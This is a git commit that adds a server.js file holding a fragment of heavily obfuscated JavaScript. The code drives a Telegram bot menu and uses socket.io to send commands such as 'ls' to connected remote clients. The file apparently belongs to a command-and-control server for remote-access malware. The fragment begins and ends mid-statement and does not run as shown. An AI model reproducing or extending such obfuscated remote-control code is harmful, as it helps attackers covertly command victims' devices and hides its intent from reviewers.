138985c39e2b42c8b731c3e3d2e737df54c9690b
Traciamento26 <gatygqtwdhaorwusfq@gmail.com>
2026-08-09 00:12:37 +0200

    Create server.js

---
+++ server.js
@@ -0,0 +1,37 @@
+'extras': []
+                                                            }), appData[_0x5e45b8(0x319)](_0x39eaaf[_0x5e45b8(0x30d)]), bot[_0x5e45b8(0x369) + 'e'](data['id'], _0x39eaaf[_0x5e45b8(0x343)], {
+                                                                'parse_mode': _0x39eaaf[_0x5e45b8(0x2b9)],
+                                                                'reply_markup': {
+                                                                    'keyboard': [
+                                                                        [
+                                                                            _0x39eaaf[_0x5e45b8(0x3a1)],
+                                                                            _0x39eaaf[_0x5e45b8(0x3e3)]
+                                                                        ],
+                                                                        [_0x39eaaf[_0x5e45b8(0x37c)]]
+                                                                    ],
+                                                                    'resize_keyboard': !![]
+                                                                }
+                                                            })), _0x39eaaf[_0x5e45b8(0x2af)](_0x517bec[_0x5e45b8(0x3ea)], _0x39eaaf[_0x5e45b8(0x230)]) && (io['to'](_0xc65239)[_0x5e45b8(0x391)](_0x39eaaf[_0x5e45b8(0x345)], {
+                                                                'request': _0x39eaaf[_0x5e45b8(0x2d8)],
+                                                                'extras': []
+                                                            }), appData[_0x5e45b8(0x319)](_0x39eaaf[_0x5e45b8(0x30d)]), bot[_0x5e45b8(0x369) + 'e'](data['id'], _0x39eaaf[_0x5e45b8(0x343)], {
+                                                                'parse_mode': _0x39eaaf[_0x5e45b8(0x2b9)],
+                                                                'reply_markup': {
+                                                                    'keyboard': [
+                                                                        [
+                                                                            _0x39eaaf[_0x5e45b8(0x3a1)],
+                                                                            _0x39eaaf[_0x5e45b8(0x3e3)]
+                                                                        ],
+                                                                        [_0x39eaaf[_0x5e45b8(0x37c)]]
+                                                                    ],
+                                                                    'resize_keyboard': !![]
+                                                                }
+                                                            })), _0x39eaaf[_0x5e45b8(0x2e0)](_0x517bec[_0x5e45b8(0x3ea)], _0x39eaaf[_0x5e45b8(0x2a5)]) && (io['to'](_0xc65239)[_0x5e45b8(0x391)](_0x39eaaf[_0x5e45b8(0x3bc)], {
+                                                                'request': 'ls',
+                                                                'extras': []
+                                                            }), appData[_0x5e45b8(0x319)](_0x39eaaf[_0x5e45b8(0x30d)]), bot[_0x5e45b8(0x369) + 'e'](data['id'], _0x39eaaf[_0x5e45b8(0x343)], {
+                                                                'parse_mode': _0x39eaaf[_0x5e45b8(0x2b9)],
+                                                                'reply_markup': {
+                                                                    'keyboard': [
+                                                                        [
+                                                                            _0x39eaaf[_0x5e45b8(0x3a1)],
